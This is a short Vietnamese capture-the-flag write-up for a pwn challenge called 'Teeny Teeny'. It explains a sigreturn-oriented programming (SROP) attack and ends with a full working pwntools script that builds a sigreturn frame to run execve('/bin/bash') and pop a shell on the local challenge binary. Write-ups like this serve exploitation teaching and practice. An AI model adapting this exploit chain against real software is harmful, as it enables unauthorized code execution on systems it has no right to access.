# Teeny Teeny

chall đầu tiên mình sử dụng **kĩ thuật SROP** :)))

làm chall này ta khỏi cần dùng ida luôn vì có cái gì để xem đâu :)))

![image](https://github.com/gookoosss/CTF/assets/128712571/25e95a3f-7b01-48ae-94c0-98253aeee500)


**chương trình chỉ ngắn như vậy thôi**

từ đầu đến syscall thì đang thiết lập **syscall read** cho phép ta nhập vào rsi

nhìn đi nhìn lại thì cũng **chỉ có syscall và pop rax là có ích cho ta khai thác**, vì vậy ta **nghĩ ngay đến kĩ thuật SROP với syscall rt_sigreturn** ta có thể setup được

sau khi đọc wu từ nhiều nguồn thì **mình thấy chương trình ko có /bin/sh nhưng mà có thể dùng /bin/bash cũng được**

![image](https://github.com/gookoosss/CTF/assets/128712571/eb5517d8-deb4-4c6e-a861-4870b7608248)


bây giờ ta đã có đầy đủ thứ mình cần rồi á, viết script và lấy shell thôi

## script:

```python 
from pwn import *

p = process('./teeny')
exe  = ELF('./teeny')

context.binary = exe

# gdb.attach(p, gdbscript = '''
# b*0x0000000000040015
# c
# ''')

# input()

binbash = 0x40238
pop_rax = 0x0000000000040018
syscall = 0x0000000000040015
ret = 0x0000000000040017

### execve

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rsi = 0
frame.rdx = 0
frame.rdi = binbash
frame.rip = syscall

### payload

payload = b'a'*8 #offset đến ret

payload += p64(pop_rax) + p64(0xf) + p64(syscall) # rt_sigreturn syscall

payload += bytes(frame) ### execve

p.send(payload)

p.interactive()
```
